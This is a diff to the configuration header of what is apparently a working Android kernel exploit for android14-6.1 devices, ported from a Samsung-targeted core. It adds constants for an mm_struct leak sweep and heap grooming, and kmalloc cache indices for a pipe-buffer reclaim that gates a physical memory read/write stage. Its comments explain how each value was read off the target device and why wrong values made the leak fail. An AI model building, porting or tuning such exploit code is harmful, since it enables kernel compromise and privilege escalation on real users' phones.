@@ -172,6 +172,25 @@
  * every android14-6.1 target the core has run on. */
 #define SKB_DATA_DELTA (-0xe80LL)
 
+/* The mm_struct slab's object size, which is the stride the leak sweeps and
+ * the divisor every grooming count is sized from. Not the core's default:
+ * that is a Samsung mm_struct, and this one is smaller. Read off the device,
+ * where /proc/slabinfo is world readable and answers it outright --
+ *
+ *     mm_struct  384 384 1024 32 8
+ *
+ * -- 1024-byte objects, 32 to a slab, 8 pages to a slab, which is also the
+ * MM_ORDER 3 the core already assumes. It agrees with the image: BTF gives
+ * sizeof(struct mm_struct) = 0x3c0, mm_init() adds cpumask_size() and asks for
+ * SLAB_HWCACHE_ALIGN, and 0x3c8 rounded up to a cache line is 0x400 whether
+ * that line is 64 or 128 bytes.
+ *
+ * Getting this wrong is not a near miss. The sweep only tests multiples of it,
+ * so at 0x500 only every fourth candidate was a real object -- which is why
+ * the leak failed most attempts and, when it did hit, the grooming counts
+ * derived from it were sized for 25 objects to a slab rather than 32. */
+#define MM_STRUCT_SZ 0x400
+
 #define SLIDE_FAKE_WAITER_PRIO 0
 #define SLIDE_WAITER_WAKE_STATE 0
 #define SLIDE_LOCK_OWNER_VALUE 1ULL
@@ -263,6 +282,19 @@
 
 #define PIPE_BUFFER_SLOTS 32
 #define PIPE_BUF_FLAG_CAN_MERGE 0x10
+
+/* The kmalloc cache the pipe-buffer reclaim identifies. Pipe buffer arrays are
+ * GFP_KERNEL_ACCOUNT, so they come from the KMALLOC_CGROUP set, and the leak's
+ * cache gate reads kmalloc_caches[type][index] to recognise the page. Both the
+ * type index and the count come from this kernel's `enum kmalloc_cache_type`,
+ * and they are not the core's Samsung defaults: with CONFIG_ZONE_DMA off,
+ * KMALLOC_DMA aliases NORMAL, and this kernel orders CGROUP before RECLAIM, so
+ * the BTF enum reads NORMAL=0, CGROUP=1, RECLAIM=2, NR_KMALLOC_TYPES=3 -- where
+ * the core assumes CGROUP=2 out of a four-type table. Reading the wrong slot
+ * makes the gate compare the page against a cache pointer it never came from,
+ * and the physical-R/W stage never starts. */
+#define KMALLOC_CGROUP_TYPE 1
+#define KMALLOC_CACHE_TYPES 3
 
 /* ------------------------------------------------------- deployment ---
  * Not about the kernel: where the bring-up run stages the bootstrap helper,
